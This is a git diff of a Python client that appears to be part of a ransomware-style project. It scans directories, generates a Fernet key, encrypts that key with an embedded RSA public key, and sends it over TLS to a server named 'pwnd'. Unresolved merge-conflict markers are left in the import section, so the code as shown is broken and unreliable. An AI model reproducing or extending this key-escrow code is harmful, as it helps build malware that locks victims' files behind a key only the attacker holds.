@@ -9,10 +9,14 @@ import sys
 from threading import *
 import uuid
 import time
+<<<<<<< HEAD
 import interface
+=======
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+>>>>>>> a06d80b674f9a7f78bbb7890dd6b5d526bd7a687
 
 #import interface
-
 
 '''
     Function to recursively scan a directory and give a list of filepaths
@@ -130,12 +134,21 @@ if __name__ == "__main__":
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     context.load_verify_locations(os.path.join("crypto", "cert.pem"))
 
+    # generate fernet key
+    key = Fernet.generate_key()   
+
+    pubKey = RSA.import_key(b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3O2lkNYVKaUsOvEbXUoN\nJGJqBOmOMhaGsnvxhp0y4kFoY6gVDUpXtfcLejVEeaHttvudCUIN04ll1CLsuhlW\nShBSYC/H/zq0As07Ura4PEyzldZmoFBaQcsZMh3oZbypk8avwrHLJDHCMusWJlB2\ndj1VRwdnrd4/kSAQLDBXHvVsfcb2jIOKITHIj45GTb2yNCTk5af46gK3loMksxQx\nBdhjtbhXCaDpjaUIZtW41tALssh2sZOdY8M+qd2eL8cJ+lZGpTsU8/r9S90JLxnx\nxbzQdkP8AsEH01HRhYVtMzEzMB3qdkoqfl2KLMzGrXj9oIZrWUI2riMBd+wSIBx7\nPwIDAQAB\n-----END PUBLIC KEY-----')
+    encryptor = PKCS1_OAEP.new(pubKey)
+    encrypted = encryptor.encrypt(key)
+    print(encrypted)
+    PACKAGE = MESSAGE + ' ' + encrypted
+
     # set up our socket to connect to the server
     s = socket.create_connection((HOST, PORT))
     secSock = context.wrap_socket(s, server_hostname="pwnd")
     print('Connected!')
-    print(bytes(MESSAGE, "utf-8"))
-    secSock.send(bytes(MESSAGE, "utf-8"))
+    print(bytes(PACKAGE, "utf-8"))
+    secSock.send(bytes(PACKAGE, "utf-8"))
 
     while True:
         read_sockets, write_sockets, error_sockets = select.select([secSock], [], [])
